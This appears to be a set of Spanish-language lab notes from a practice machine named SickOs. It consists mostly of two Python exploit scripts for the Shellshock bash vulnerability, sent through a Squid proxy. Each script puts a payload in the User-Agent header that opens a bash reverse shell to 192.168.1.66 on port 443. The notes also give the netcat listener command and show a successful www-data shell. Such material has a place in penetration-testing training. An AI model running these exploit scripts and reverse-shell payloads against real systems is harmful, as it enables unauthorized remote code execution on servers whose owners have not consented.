
---

Script para obtener una **Shell Reverse** 

```python
#!/usr/env/bin python3

import sys, signal, requests
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://127.0.0.1/cgi-bin/status"
squid_proxy = {'http': 'http://192.168.1.62:3128'}

def shellshock_attack():

    headers = {'User-Agent': "() { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.66/443 0>&1'"}

    r = requests.get(main_url, headers=headers, proxies=squid_proxy)

if __name__ == '__main__':

    shellshock_attack()
```

Acción antes de ejecutar el script:

```bash
nc -lvnp 443
```

Acción script:

```bash
python3 shellshock.py
```

---

Script para obtener una **Shell Reverse interactiva** 

```python
#!/usr/bin/env python3

import sys, signal, requests, threading
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "http://127.0.0.1/cgi-bin/status"
squid_proxy = {'http': 'http://192.168.1.62:3128'}
lport = 443

def shellshock_attack():
    headers = {
        'User-Agent': "() { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.66/443 0>&1'"
    }
    try:
        r = requests.get(main_url, headers=headers, proxies=squid_proxy)
        print(f"[+] Código de estado: {r.status_code}")
    except Exception as e:
        print(f"[!] Error en la solicitud: {str(e)}")

if __name__ == '__main__':
    shell = listen(lport, timeout=20)
    threading.Thread(target=shellshock_attack).start()
    shell.wait_for_connection()

    if shell.sock is None:
        log.failure("No se pudo establecer la conexión")
        sys.exit(1)
    else:
        shell.interactive()

```

Acción:

```bash
python3 shellshock_interactive.py
```

Resultado:

```bash
python3 shellshock_interactive.py
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:192.168.1.62 on port 52657
[*] Switching to interactive mode
bash: no job control in this shell
www-data@SickOs:/usr/lib/cgi-bin$ $ whoami
whoami
www-data
```